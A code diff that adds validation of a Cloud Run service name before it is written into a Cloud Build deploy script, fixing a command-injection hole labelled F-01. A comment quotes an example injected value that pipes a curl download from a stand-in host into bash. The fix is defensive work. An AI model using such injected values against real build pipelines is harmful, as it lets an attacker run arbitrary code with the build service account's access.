@@ -18,6 +18,7 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import * as api from '../../services/apiService';
 import { GcsBucket } from '../../types';
+import { assertValidGcpResourceName } from '../../services/shellSafety';
 
 import JSZip from 'jszip';
 
@@ -178,6 +179,19 @@ This function is deployed using Google Cloud Build.
         addLog(`Starting deployment for ${serviceName}...`);
 
         try {
+            // SECURITY (F-01): `serviceName` is interpolated unquoted-by-template into
+            // the generated deploy.sh (`SERVICE_NAME="..."`), which Cloud Build executes
+            // via `entrypoint: bash`. A value such as `x"; curl untrusted.example.com/s.sh | bash; #` would
+            // run arbitrary commands as the build service account. Cloud Run service
+            // names must already match this allowlist, so no working deploy is affected.
+            assertValidGcpResourceName(serviceName, 'Service name');
+            // SECURITY (F-01): `projectId` is also interpolated below, into the build
+            // step's `env` entry. It is deliberately NOT asserted: Cloud Build passes
+            // env entries to the container directly rather than through a shell, so it
+            // is not an injection sink here, and the opaque-id allowlist would reject
+            // legacy domain-scoped project IDs ("example.com:proj") -- breaking a
+            // working deploy for no security benefit.
+
             // 1. Create Zip
             const zip = new JSZip();
             addLog("Preparing source files...");
